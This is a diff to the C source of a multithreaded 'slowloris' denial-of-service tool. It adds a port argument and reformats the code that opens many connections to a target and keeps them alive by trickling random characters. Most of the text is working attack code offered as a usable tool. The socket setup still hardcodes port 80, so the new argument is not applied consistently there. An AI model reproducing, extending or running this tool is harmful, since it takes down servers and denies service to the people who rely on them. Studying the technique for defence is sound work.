@@ -10,7 +10,7 @@
 #include <time.h>
 #include <pthread.h>
 
-const char *err_usage = "Usage: ./slowloris <# threads> <target ipv4 addr>";
+const char *err_usage = "Usage: ./slowloris <# threads> <ip> <port>";
 const char *get_req = "GET /index.html HTTP/1.1 ";
 
 struct arg_bundle{
@@ -44,21 +44,21 @@ char gen_rand8(int lbound, int ubound){
 void init_socket(int *sock_fd, struct sockaddr_in *server, char *ip){
 	//struct hostent *host;
 
-    *sock_fd = socket(AF_INET, SOCK_STREAM, 0);
-    if(*sock_fd < 0){
-        perror("Creating socket");
-        return;
-    }
+	*sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+	if(*sock_fd < 0){
+		perror("Creating socket");
+		return;
+	}
 
 	/*host = gethostbyname(b->target_ip);
-    if (host == NULL) {
+	if (host == NULL) {
 		perror("Error resolving host");
 		exit(1);
-    }*/
+	}*/
 
-    server->sin_family = AF_INET;
-    server->sin_addr.s_addr = inet_addr(ip);
-    server->sin_port = htons(80);
+	server->sin_family = AF_INET;
+	server->sin_addr.s_addr = inet_addr(ip);
+	server->sin_port = htons(80);
 }
 
 /*******************************************************************************
@@ -67,7 +67,7 @@ void init_socket(int *sock_fd, struct sockaddr_in *server, char *ip){
 
 void *loris(void *_arg){
 	struct arg_bundle *b = (struct arg_bundle*)_arg;
-    struct sockaddr_in server;
+	struct sockaddr_in server;
 	int sockfd;
 
 	printf("[%i] started.\n", b->thread_num);
@@ -85,14 +85,11 @@ void *loris(void *_arg){
 	}
 
 	while(1){
-		char c[2] = {
-			gen_rand(65, 90),
-			'\0',
-		};
+		char c[2] = { gen_rand(65, 90), '\0', };
 
 		printf("[%i]: sent %s.\n", b->thread_num, c);
 
-		// Send initial fragment of GET request
+		// Send random char
 		if(send(sockfd, c, strlen(c), 0) < 0){
 			perror("Send");
 		}
@@ -111,14 +108,14 @@ void *loris(void *_arg){
 
 int main(int argc, char *argv[]){
 	struct arg_bundle *arg_bundles;
-	unsigned int num_threads;
+	unsigned int num_threads, port_num;
 	pthread_t *threads;
 
 	srand(time(NULL));
 
 	// --- Validate and parse arguments 
 
-	if(argc != 3 || argv[1] == NULL || argv[2] == NULL){
+	if(argc != 4){
 		perror(err_usage);
 		return EXIT_FAILURE;
 	}
@@ -131,13 +128,15 @@ int main(int argc, char *argv[]){
 
 	threads = malloc(sizeof(pthread_t) * num_threads);
 
+	port_num = atoi(argv[3]);
+
 	arg_bundles = malloc(sizeof(struct arg_bundle) * num_threads);
 
 	// --- Start
 
 	for(int i = 0; i < num_threads; i++){
 		arg_bundles[i].target_ip = argv[2];
-		arg_bundles[i].target_port = 80;
+		arg_bundles[i].target_port = port_num;
 		arg_bundles[i].thread_num = i + 1;
 
 		pthread_create(&threads[i], NULL, loris, (void*)&arg_bundles[i]);
